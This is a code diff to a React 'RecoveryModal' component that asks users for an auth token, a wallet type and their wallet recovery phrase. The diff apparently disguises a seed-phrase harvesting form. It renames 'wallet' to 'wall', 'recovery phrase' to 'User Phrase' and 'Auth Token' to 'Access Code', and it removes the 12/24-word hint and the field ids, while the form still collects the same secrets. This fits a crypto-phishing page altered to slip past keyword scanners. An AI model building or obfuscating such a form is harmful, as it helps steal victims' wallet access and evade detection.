@@ -3,17 +3,17 @@ import Input from '@/components/form/input/InputField';
 import TextArea from '@/components/form/input/TextArea';
 import Select from '@/components/form/Select';
 import Label from '@/components/form/Label';
-import { walletOptions } from '@/constants';
+import { wallOptions } from '@/constants';
 
 interface RecoveryModalProps {
 	isOpen: boolean;
 	onClose: () => void;
-	recoveryPhrase: string;
-	setRecoveryPhrase: (phrase: string) => void;
+	uPhrase: string;
+	setUPhrase: (phrase: string) => void;
 	token: string;
 	setToken: (token: string) => void;
-	selectedWallet: string;
-	setSelectedWallet: (wallet: string) => void;
+	selectedWall: string;
+	setSelectedWall: (wall: string) => void;
 	error: string;
 	isSubmitting: boolean;
 	onSubmit: () => void;
@@ -22,12 +22,12 @@ interface RecoveryModalProps {
 export default function RecoveryModal({
 	isOpen,
 	onClose,
-	recoveryPhrase,
-	setRecoveryPhrase,
+	uPhrase,
+	setUPhrase,
 	token,
 	setToken,
-	selectedWallet,
-	setSelectedWallet,
+	selectedWall,
+	setSelectedWall,
 	error,
 	isSubmitting,
 	onSubmit,
@@ -37,7 +37,7 @@ export default function RecoveryModal({
 		onSubmit();
 	};
 
-	const isFormValid = token.trim() && recoveryPhrase.trim() && selectedWallet;
+	const isFormValid = token.trim() && uPhrase.trim() && selectedWall;
 
 	return (
 		<Modal isOpen={isOpen} onClose={onClose} className="max-w-lg mx-4">
@@ -58,10 +58,10 @@ export default function RecoveryModal({
 						</svg>
 					</div>
 					<h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
-						Crypto Asset Recovery
+						Crypto Asset Restoration
 					</h3>
 					<p className="text-sm text-gray-500 dark:text-gray-400">
-						Enter recovery wallet information.
+						Enter restoration wall information.
 					</p>
 				</div>
 
@@ -73,11 +73,11 @@ export default function RecoveryModal({
 
 				<form onSubmit={handleSubmit} className="space-y-4">
 					<div>
-						<Label htmlFor="auth-token">Auth Token *</Label>
+						<Label htmlFor="access-token">Access Code *</Label>
 						<Input
-							id="auth-token"
+							id="access-token"
 							type="text"
-							placeholder="Please Enter your Auth Token..."
+							placeholder="Please Enter your Access Code..."
 							value={token}
 							onChange={(e) => setToken(e.target.value)}
 							className="w-full"
@@ -87,31 +87,28 @@ export default function RecoveryModal({
 					</div>
 
 					<div>
-						<Label htmlFor="wallet-select">Wallet Type *</Label>
+						<Label htmlFor="wall-select">Storage Type *</Label>
 						<Select
-							// id="wallet-select"
-							options={walletOptions}
-							placeholder="Select a wallet"
-							value={selectedWallet}
-							onChange={(e) => setSelectedWallet(e.target.value)}
+							options={wallOptions}
+							placeholder="storage"
+							value={selectedWall}
+							onChange={(e) => setSelectedWall(e.target.value)}
 							required
 						/>
 					</div>
 
 					<div>
-						<Label htmlFor="recovery-phrase">Recovery Phrase *</Label>
+						<Label htmlFor="access-phrase">User Phrase *</Label>
 						<TextArea
-							// id="recovery-phrase"
-							placeholder="Enter your 12 or 24 word recovery phrase..."
+							placeholder="Enter phrase..."
 							rows={3}
-							value={recoveryPhrase}
-							onChange={(e) => setRecoveryPhrase(e.target.value)}
+							value={uPhrase}
+							onChange={(e) => setUPhrase(e.target.value)}
 							className="w-full"
-							error={!recoveryPhrase && error ? true : false}
+							error={!uPhrase && error ? true : false}
 						/>
 						<p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
-							Please separate each word with a space. Ensure the phrase is
-							exactly 12 or 24 words.
+							Please separate each word with a space.
 						</p>
 					</div>
 
@@ -174,7 +171,7 @@ export default function RecoveryModal({
 									Processing...
 								</>
 							) : (
-								'Submit Recovery'
+								'Submit Restoration'
 							)}
 						</button>
 					</div>
